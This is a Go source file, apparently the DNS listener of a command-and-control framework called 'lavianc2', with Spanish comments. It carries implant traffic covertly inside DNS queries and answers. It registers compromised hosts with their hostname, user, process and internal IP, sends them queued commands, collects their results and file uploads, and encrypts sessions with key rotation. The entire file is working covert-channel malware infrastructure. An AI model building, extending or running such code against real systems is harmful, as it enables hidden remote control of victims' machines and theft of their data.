package listeners

import (
	"context"
	"crypto/ecdh"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log/slog"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/miekg/dns"
	"github.com/uLl0a/lavianc2/internal/beacons"
	"github.com/uLl0a/lavianc2/internal/crypto"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
	"github.com/uLl0a/lavianc2/internal/profiles"
	"github.com/uLl0a/lavianc2/internal/protocol"
	"github.com/uLl0a/lavianc2/internal/sessions"
	"github.com/uLl0a/lavianc2/internal/storage"
	"github.com/uLl0a/lavianc2/internal/transfers"
)

// DNSListener implementa un listener DNS con tunneling TXT/A.
type DNSListener struct {
	ID       uuid.UUID
	Name     string
	BindAddr string
	Domain   string

	store    *storage.Store
	registry *sessions.Registry
	bus      *events.Bus
	log      *slog.Logger
	router   *protocol.Router
	crypto   *crypto.SessionCryptoStore

	// Perfil DNS activo (por defecto dns-txt).
	profile *profiles.DNSProfile

	// Intervalo de rekey para las sesiones nuevas (0 = default).
	rekeyEvery uint64

	// Par X25519 persistente del server. Se usa para el handshake ECDH
	// con los implantes DNS. Compartido con el listener HTTPS y con el
	// builder, para que todos usen la misma clave pública.
	serverKeys *crypto.ServerKeyStore
	serverPriv *ecdh.PrivateKey

	beaconMgr *beacons.Manager
	transfers *transfers.Manager

	// Estado interno.
	server *dns.Server
	mu     sync.Mutex

	// Buffers de chunks en vuelo: implant-id -> {seq: chunk}.
	pendingChunks map[string]map[int]string

	// Total esperado por implant-id.
	pendingTotal map[string]int

	// Momento en que llegó el primer chunk pendiente de cada implant-id.
	// Sirve para expirar reensamblados abandonados.
	pendingSince map[string]time.Time

	// Respuestas listas para entregar en el proximo poll.
	responses map[string][]string

	// TTL de un reensamblado incompleto antes de descartarlo.
	chunkTTL time.Duration
}

// NewDNSListener crea un listener DNS con persistencia de claves de sesion.
//
// Recibe un ServerKeyStore (par X25519 persistente del team server) en
// lugar de generar un par efimero. Esto garantiza que los implantes DNS
// construidos con builds anteriores sigan pudiendo hacer handshake tras
// un reinicio del server.
func NewDNSListener(
	id uuid.UUID, name, bindAddr, domain string,
	store *storage.Store,
	registry *sessions.Registry,
	bus *events.Bus,
	serverKeys *crypto.ServerKeyStore,
	beaconMgr *beacons.Manager,
	transferMgr *transfers.Manager,
	rekeyEvery uint64,
	log *slog.Logger,
) (*DNSListener, error) {
	if serverKeys == nil {
		return nil, fmt.Errorf("listener dns: server key store requerido")
	}

	// Cargar perfil DNS por defecto.
	dnsRegistry := profiles.NewDNSRegistry()
	profile, err := dnsRegistry.Get("dns-txt")
	if err != nil {
		return nil, fmt.Errorf("listener dns: cargar perfil: %w", err)
	}
	// Sobrescribir el dominio con el del listener.
	profile.Domain = domain

	l := &DNSListener{
		ID:         id,
		Name:       name,
		BindAddr:   bindAddr,
		Domain:     domain,
		store:      store,
		registry:   registry,
		bus:        bus,
		log:        log,
		serverKeys: serverKeys,
		transfers:  transferMgr,
		serverPriv: serverKeys.PrivateKey(),
		beaconMgr:  beaconMgr,
		profile:    profile,
		rekeyEvery: rekeyEvery,
		router:     protocol.NewRouter(log),
		crypto:     crypto.NewSessionCryptoStoreWithRepo(store.SessionKeys),

		pendingChunks: make(map[string]map[int]string),
		pendingTotal:  make(map[string]int),
		pendingSince:  make(map[string]time.Time),
		responses:     make(map[string][]string),
		chunkTTL:      5 * time.Minute,
	}

	// Registrar handlers en el router (mismos que HTTPS).
	l.router.MustRegister(protocol.MsgCheckin, l.handleCheckinEnvelope)
	l.router.MustRegister(protocol.MsgTaskPull, l.handleTaskPullEnvelope)
	l.router.MustRegister(protocol.MsgTaskResult, l.handleTaskResultEnvelope)
	l.router.MustRegister(protocol.MsgHeartbeat, l.handleHeartbeatEnvelope)
	l.router.MustRegister(protocol.MsgKeyRotation, l.handleKeyRotationEnvelope)
	l.router.MustRegister(protocol.MsgFileChunk, l.handleFileChunkEnvelope)

	bus.Subscribe(events.TopicImplantDead, func(ctx context.Context, ev events.Event) {
		id, ok := ev.Payload.(uuid.UUID)
		if !ok {
			return
		}
		if err := l.crypto.Delete(context.Background(), id); err != nil {
			l.log.Warn("dns: limpiar sesión muerta", "err", err, "implant", id)
			return
		}
		l.registry.Unregister(id)
		l.log.Info("dns: sesión limpiada", "implant", id)
	})

	return l, nil
}

func (l *DNSListener) handleFileChunkEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("file chunk: wrapper inválido: %w", err)
	}
	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("file chunk: implant_id inválido: %w", err)
	}

	sc, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("file chunk: sesión %s sin claves", implantID)
	}
	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("file chunk: descifrar: %w", err)
	}

	var wire protocol.FileTransferWire
	if err := json.Unmarshal(plaintext, &wire); err != nil {
		return nil, fmt.Errorf("file chunk: unmarshal: %w", err)
	}

	if l.transfers != nil {
		if err := l.transfers.Handle(ctx, &wire, implantID); err != nil {
			l.log.Warn("file chunk: handle", "err", err, "kind", wire.Kind, "id", wire.TransferID)
			return nil, fmt.Errorf("file chunk: %w", err)
		}
	}

	// ACK simple. El cliente puede ignorarlo, pero confirmar la recepción
	// de cada chunk permite en el futuro implementar retransmisiones.
	return protocol.NewEnvelope(protocol.MsgFileChunk, []byte("ok")), nil
}

// Metadata devuelve la informacion identificativa del listener.
func (l *DNSListener) Metadata() ListenerMetadata {
	return ListenerMetadata{
		ID:   l.ID,
		Name: l.Name,
		Type: "dns",
	}
}

// Start arranca el servidor DNS en UDP y bloquea hasta que ctx se cancela.
func (l *DNSListener) Start(ctx context.Context) error {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", l.handleQuery)

	l.server = &dns.Server{
		Addr:    l.BindAddr,
		Net:     "udp",
		Handler: mux,
	}

	errCh := make(chan error, 1)
	go func() {
		l.log.Info("DNS listener activo",
			"addr", l.BindAddr,
			"domain", l.Domain,
			"profile", l.profile.Name,
		)
		if err := l.server.ListenAndServe(); err != nil {
			errCh <- err
		}
	}()

	select {
	case <-ctx.Done():
		return l.Stop(context.Background())
	case err := <-errCh:
		return err
	}
}

// Stop detiene el servidor DNS de forma graceful.
func (l *DNSListener) Stop(ctx context.Context) error {
	if l.server == nil {
		return nil
	}
	l.log.Info("deteniendo DNS listener")
	return l.server.ShutdownContext(ctx)
}

// handleQuery procesa queries DNS entrantes usando el DNSProfile activo.
func (l *DNSListener) handleQuery(w dns.ResponseWriter, r *dns.Msg) {
	if len(r.Question) == 0 {
		return
	}
	q := r.Question[0]
	if q.Qtype != dns.TypeTXT && q.Qtype != dns.TypeA {
		l.sendEmptyResponse(w, r)
		return
	}

	data, seq, total, sessionID, err := l.profile.ParseQNAME(q.Name)
	if err != nil {
		l.sendEmptyResponse(w, r)
		return
	}

	resp := l.processChunk(sessionID, seq, total, string(data))
	l.sendProfileResponse(w, r, resp)
}

func (l *DNSListener) processChunk(implantID string, seq, total int, chunk string) string {
	l.mu.Lock()
	defer l.mu.Unlock()

	// Poll sin datos: devolver respuesta pendiente si la hay.
	if total == 1 && chunk == "" {
		if resp, ok := l.responses[implantID]; ok && len(resp) > 0 {
			out := resp[0]
			l.responses[implantID] = resp[1:]
			if len(l.responses[implantID]) == 0 {
				delete(l.responses, implantID)
			}
			return out
		}
		return ""
	}

	// Expirar reensamblados abandonados: si el primer chunk de este
	// implante lleva más de chunkTTL sin completarse, descartarlo y
	// empezar de cero. Evita acumular RAM de implantes que envían
	// chunks parciales y desaparecen.
	if since, ok := l.pendingSince[implantID]; ok && time.Since(since) > l.chunkTTL {
		l.log.Warn("dns: reensamblado expirado por TTL",
			"implant", implantID,
			"chunks", len(l.pendingChunks[implantID]),
			"total_esperado", l.pendingTotal[implantID],
			"ttl", l.chunkTTL.String(),
		)
		delete(l.pendingChunks, implantID)
		delete(l.pendingTotal, implantID)
		delete(l.pendingSince, implantID)
	}

	// Acumular chunk.
	if l.pendingChunks[implantID] == nil {
		l.pendingChunks[implantID] = make(map[int]string)
		l.pendingSince[implantID] = time.Now()
	}
	l.pendingChunks[implantID][seq] = chunk
	l.pendingTotal[implantID] = total

	l.log.Debug("dns: chunk recibido",
		"implant", implantID,
		"seq", seq,
		"total", total,
		"chunk_len", len(chunk),
		"pending_count", len(l.pendingChunks[implantID]),
	)

	if len(l.pendingChunks[implantID]) < total {
		return "ack"
	}

	// Reensamblar.
	var sb strings.Builder
	for i := 0; i < total; i++ {
		c, ok := l.pendingChunks[implantID][i]
		if !ok {
			return "err"
		}
		sb.WriteString(c)
	}
	fullEncoded := sb.String()

	// Limpiar buffers.
	delete(l.pendingChunks, implantID)
	delete(l.pendingTotal, implantID)
	delete(l.pendingSince, implantID)

	// Decodificar segun el perfil.
	envelopeBytes, err := l.profile.DecodeData(fullEncoded)

	if err != nil {
		l.log.Warn("dns: decodificar fallo",
			"err", err,
			"encoding", l.profile.Encoding,
			"implant", implantID,
		)
		return "err"
	}

	env, err := protocol.UnmarshalEnvelope(envelopeBytes)
	if err != nil {
		l.log.Warn("dns: envelope invalido", "err", err, "implant", implantID)
		return "err"
	}

	ctx := context.Background()
	respEnv, err := l.router.Dispatch(ctx, env)
	if err != nil {
		l.log.Error("dns: dispatch", "err", err, "type", env.Type, "implant", implantID)
		return "err"
	}

	respBytes, err := respEnv.Marshal()
	if err != nil {
		l.log.Error("dns: marshal respuesta", "err", err)
		return "err"
	}
	return l.profile.EncodeData(respBytes)
}

// sendProfileResponse envia la respuesta segun el RecordType del perfil.
func (l *DNSListener) sendProfileResponse(w dns.ResponseWriter, r *dns.Msg, payload string) {
	switch l.profile.RecordType {
	case profiles.RecordA:
		l.sendAResponse(w, r, payload)
	case profiles.RecordAAAA:
		l.sendAAAAResponse(w, r, payload)
	case profiles.RecordCNAME:
		l.sendCNAMEResponse(w, r, payload)
	default:
		l.sendTXTResponse(w, r, payload)
	}
}

// sendTXTResponse envia un TXT con la respuesta.
func (l *DNSListener) sendTXTResponse(w dns.ResponseWriter, r *dns.Msg, payload string) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	txt := &dns.TXT{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeTXT,
			Class:  dns.ClassINET,
			Ttl:    uint32(l.profile.TTL),
		},
		Txt: []string{payload},
	}
	m.Answer = append(m.Answer, txt)

	m.SetEdns0(4096, false)
	_ = w.WriteMsg(m)
}

// sendAResponse envia un registro A (4 bytes).
func (l *DNSListener) sendAResponse(w dns.ResponseWriter, r *dns.Msg, payload string) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	ip := l.profile.IdleIP
	if ip == "" {
		ip = "0.0.0.0"
	}

	a := &dns.A{
		Hdr: dns.RR_Header{
			Name:   r.Question[0].Name,
			Rrtype: dns.TypeA,
			Class:  dns.ClassINET,
			Ttl:    uint32(l.profile.TTL),
		},
		A: parseIP(ip),
	}
	m.Answer = append(m.Answer, a)
	_ = w.WriteMsg(m)
}

// sendAAAAResponse envia un registro AAAA.
func (l *DNSListener) sendAAAAResponse(w dns.ResponseWriter, r *dns.Msg, payload string) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	_ = w.WriteMsg(m)
}

// sendCNAMEResponse envia un registro CNAME.
func (l *DNSListener) sendCNAMEResponse(w dns.ResponseWriter, r *dns.Msg, payload string) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	_ = w.WriteMsg(m)
}

// sendEmptyResponse responde con NXDOMAIN.
func (l *DNSListener) sendEmptyResponse(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Rcode = dns.RcodeNameError
	_ = w.WriteMsg(m)
}

// EnqueueCommand anade una respuesta pendiente para un implante.
func (l *DNSListener) EnqueueCommand(implantID, payload string) {
	l.mu.Lock()
	defer l.mu.Unlock()
	l.responses[implantID] = append(l.responses[implantID], payload)
}

// handleCheckinEnvelope procesa MsgCheckin.
func (l *DNSListener) handleCheckinEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		SessionKey string `json:"session_key"`
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		Process    string `json:"process"`
		InternalIP string `json:"internal_ip"`
		Sleep      int    `json:"sleep"`
		Jitter     int    `json:"jitter"`
		PublicKey  string `json:"public_key"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("dns checkin: payload invalido: %w", err)
	}
	if req.SessionKey == "" || req.PublicKey == "" {
		return nil, fmt.Errorf("dns checkin: session_key y public_key requeridos")
	}
	sleep := req.Sleep
	if sleep <= 0 {
		sleep = l.profile.Sleep
	}
	jitter := req.Jitter
	if jitter < 0 {
		jitter = 0
	}

	pubBytes, err := base64.StdEncoding.DecodeString(req.PublicKey)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: public_key no es base64: %w", err)
	}
	implantPub, err := crypto.PublicKeyFromBytes(pubBytes)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: public_key malformada: %w", err)
	}

	implant, err := l.store.Implants.GetBySessionKey(ctx, req.SessionKey)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: buscar implante: %w", err)
	}

	now := time.Now().UTC()
	if implant == nil {
		implant = &models.Implant{
			ID:            uuid.New(),
			SessionKey:    req.SessionKey,
			Hostname:      req.Hostname,
			Username:      req.Username,
			OS:            req.OS,
			Arch:          req.Arch,
			PID:           req.PID,
			ProcessName:   req.Process,
			InternalIP:    req.InternalIP,
			ListenerID:    l.ID,
			PublicKey:     pubBytes,
			Status:        models.ImplantAlive,
			SleepInterval: sleep,
			Jitter:        jitter,
			FirstSeen:     now,
			LastCheckIn:   now,
			Metadata:      map[string]any{"transport": "dns"},
		}
		if err := l.store.Implants.Create(ctx, implant); err != nil {
			return nil, fmt.Errorf("dns checkin: crear implante: %w", err)
		}
		l.log.Info("nuevo implante DNS",
			"id", implant.ID,
			"session_key", req.SessionKey,
			"host", req.Hostname,
		)
	} else {
		implant.Hostname = req.Hostname
		implant.Username = req.Username
		implant.OS = req.OS
		implant.Arch = req.Arch
		implant.PID = req.PID
		implant.ProcessName = req.Process
		implant.InternalIP = req.InternalIP
		implant.PublicKey = pubBytes
		implant.LastCheckIn = now
		implant.Status = models.ImplantAlive
		if err := l.store.Implants.UpdateCheckin(ctx, implant); err != nil {
			l.log.Error("dns checkin: actualizar implante", "err", err)
		}
	}

	l.registry.Register(implant.ID)

	sessionCrypto, err := crypto.NewSessionCrypto(l.serverPriv, implantPub, req.SessionKey, l.rekeyEvery)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: derivar session crypto: %w", err)
	}
	if err := l.crypto.Set(ctx, implant.ID, sessionCrypto); err != nil {
		l.log.Error("dns checkin: persistir session keys", "err", err)
	}

	l.bus.Publish(ctx, events.Event{
		Topic:   events.TopicImplantCheckin,
		Payload: implant.ID,
	})

	resp := map[string]any{
		"implant_id": implant.ID.String(),
		"server_pub": base64.StdEncoding.EncodeToString(l.serverPriv.PublicKey().Bytes()),
		"sleep":      implant.SleepInterval,
		"jitter":     implant.Jitter,
	}
	respBytes, err := json.Marshal(resp)
	if err != nil {
		return nil, fmt.Errorf("dns checkin: marshal respuesta: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgCheckin, respBytes), nil
}

func (l *DNSListener) handleTaskPullEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("dns task pull: wrapper invalido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("dns task pull: implant_id invalido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("dns task pull: sesion %s sin claves", implantID)
	}

	if l.beaconMgr != nil {
		l.beaconMgr.TouchByImplant(implantID)
	}

	// Validar la autenticación del ciphertext (aunque hoy no usemos el plaintext).
	if len(wrapper.Data) > 0 {
		if _, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil); err != nil {
			return nil, fmt.Errorf("dns task pull: descifrar: %w", err)
		}
	}

	if sessionCrypto.ShouldRekey() {
		return l.initiateRekey(ctx, implantID, sessionCrypto)
	}

	tasks, err := l.store.Tasks.ClaimPendingTasksForImplant(ctx, implantID, 32)
	if err != nil {
		return nil, fmt.Errorf("dns task pull: listar tareas: %w", err)
	}

	wire := make([]protocol.TaskWire, 0, len(tasks))
	for _, t := range tasks {
		wire = append(wire, protocol.TaskWire{
			ID:      t.ID.String(),
			Command: t.Command,
			Args:    t.Args,
			Payload: t.Payload,
		})
	}
	tasksJSON, err := json.Marshal(wire)
	if err != nil {
		return nil, fmt.Errorf("dns task pull: marshal tareas: %w", err)
	}

	encrypted, err := sessionCrypto.EncryptForBeacon(tasksJSON, nil)
	if err != nil {
		return nil, fmt.Errorf("dns task pull: cifrar respuesta: %w", err)
	}

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("dns task pull: persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskDispatch, encrypted), nil
}

func (l *DNSListener) handleTaskResultEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("dns task result: wrapper invalido: %w", err)
	}

	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("dns task result: implant_id invalido: %w", err)
	}

	sessionCrypto, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("dns task result: sesion %s sin claves", implantID)
	}

	plaintext, err := sessionCrypto.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("dns task result: descifrar: %w", err)
	}

	var result protocol.TaskResultWire
	if err := json.Unmarshal(plaintext, &result); err != nil {
		return nil, fmt.Errorf("dns task result: payload invalido: %w", err)
	}

	taskID, err := uuid.Parse(result.TaskID)
	if err != nil {
		return nil, fmt.Errorf("dns task result: task_id invalido: %w", err)
	}

	status := models.TaskCompleted
	if result.Error != "" {
		status = models.TaskFailed
	}
	if err := l.store.Tasks.UpdateTaskStatus(ctx, taskID, status, result.Output, result.Error); err != nil {
		return nil, fmt.Errorf("dns task result: actualizar tarea: %w", err)
	}

	l.bus.Publish(ctx, events.Event{
		Topic: events.TopicTaskCompleted,
		Payload: map[string]any{
			"task_id":    taskID,
			"implant_id": implantID,
			"status":     status,
			"output":     result.Output,
			"error":      result.Error,
		},
	})

	sessionCrypto.IncrementMsg()
	go func() {
		if err := l.crypto.Save(context.Background(), implantID); err != nil {
			l.log.Warn("dns task result: persistir msgCount", "err", err)
		}
	}()

	return protocol.NewEnvelope(protocol.MsgTaskResult, []byte("ok")), nil
}

func (l *DNSListener) handleHeartbeatEnvelope(ctx context.Context, env *protocol.Envelope) (*protocol.Envelope, error) {
	var req struct {
		ImplantID string `json:"implant_id"`
	}
	if err := json.Unmarshal(env.Payload, &req); err != nil {
		return nil, fmt.Errorf("dns heartbeat: payload invalido: %w", err)
	}

	if req.ImplantID != "" {
		implantID, err := uuid.Parse(req.ImplantID)
		if err == nil {
			_ = l.store.Implants.UpdateStatus(ctx, implantID, models.ImplantAlive)
		}
	}

	return protocol.NewEnvelope(protocol.MsgHeartbeat, []byte("pong")), nil
}

func parseIP(s string) net.IP {
	return net.ParseIP(s)
}

func (l *DNSListener) initiateRekey(
	ctx context.Context,
	implantID uuid.UUID,
	sc *crypto.SessionCrypto,
) (*protocol.Envelope, error) {
	ephPriv, ephPub, err := crypto.GenerateKeyPair()
	if err != nil {
		return nil, fmt.Errorf("dns rekey: generar eph: %w", err)
	}
	l.crypto.SetPendingRekey(implantID, ephPriv)

	req := map[string]string{
		"server_eph_pub": base64.StdEncoding.EncodeToString(ephPub.Bytes()),
	}
	reqJSON, _ := json.Marshal(req)
	encrypted, err := sc.EncryptForBeacon(reqJSON, nil)
	if err != nil {
		_ = l.crypto.TakePendingRekey(implantID)
		return nil, fmt.Errorf("dns rekey: cifrar: %w", err)
	}

	l.log.Info("dns rekey iniciado", "implant", implantID)
	return protocol.NewEnvelope(protocol.MsgKeyRotation, encrypted), nil
}

func (l *DNSListener) handleKeyRotationEnvelope(
	ctx context.Context,
	env *protocol.Envelope,
) (*protocol.Envelope, error) {
	var wrapper protocol.EncryptedWrapper
	if err := json.Unmarshal(env.Payload, &wrapper); err != nil {
		return nil, fmt.Errorf("dns rekey: wrapper inválido: %w", err)
	}
	implantID, err := uuid.Parse(wrapper.ImplantID)
	if err != nil {
		return nil, fmt.Errorf("dns rekey: implant_id inválido: %w", err)
	}

	sc, ok := l.crypto.Get(ctx, implantID)
	if !ok {
		return nil, fmt.Errorf("dns rekey: sesión %s sin claves", implantID)
	}

	plaintext, err := sc.DecryptFromBeacon(wrapper.Data, nil)
	if err != nil {
		return nil, fmt.Errorf("dns rekey: descifrar: %w", err)
	}

	var req struct {
		ImplantEphPub string `json:"implant_eph_pub"`
	}
	if err := json.Unmarshal(plaintext, &req); err != nil {
		return nil, fmt.Errorf("dns rekey: payload inválido: %w", err)
	}
	implantEphPubBytes, err := base64.StdEncoding.DecodeString(req.ImplantEphPub)
	if err != nil {
		return nil, fmt.Errorf("dns rekey: eph_pub no es base64: %w", err)
	}
	implantEphPub, err := crypto.PublicKeyFromBytes(implantEphPubBytes)
	if err != nil {
		return nil, fmt.Errorf("dns rekey: eph_pub malformada: %w", err)
	}

	serverEphPriv := l.crypto.TakePendingRekey(implantID)
	if serverEphPriv == nil {
		return nil, fmt.Errorf("dns rekey: sin eph pendiente para %s", implantID)
	}
	if err := sc.ApplyRekeyAsServer(serverEphPriv, implantEphPub); err != nil {
		return nil, fmt.Errorf("dns rekey: aplicar: %w", err)
	}
	if err := l.crypto.Save(ctx, implantID); err != nil {
		l.log.Warn("dns rekey: persistir", "err", err)
	}

	l.log.Info("dns rekey completado", "implant", implantID)

	okBytes, err := sc.EncryptForBeacon([]byte("ok"), nil)
	if err != nil {
		return nil, fmt.Errorf("dns rekey: cifrar ack: %w", err)
	}
	return protocol.NewEnvelope(protocol.MsgKeyRotation, okBytes), nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ExpirePendingRekeys purga los rekeys pendientes expirados del store
// criptográfico del listener. Lo llama el janitor del server.
func (l *DNSListener) ExpirePendingRekeys() []uuid.UUID {
	return l.crypto.ExpirePendingRekeys()
}

// ExpireStaleChunks purga los reensamblados DNS que superaron su TTL.
// Los chunks TTL ya se purgan al vuelo en processChunk, pero este método
// permite limpiar implantes que nunca vuelven a enviar otro chunk.
func (l *DNSListener) ExpireStaleChunks() []string {
	l.mu.Lock()
	defer l.mu.Unlock()
	var expired []string
	for id, since := range l.pendingSince {
		if time.Since(since) > l.chunkTTL {
			delete(l.pendingChunks, id)
			delete(l.pendingTotal, id)
			delete(l.pendingSince, id)
			expired = append(expired, id)
		}
	}
	return expired
}
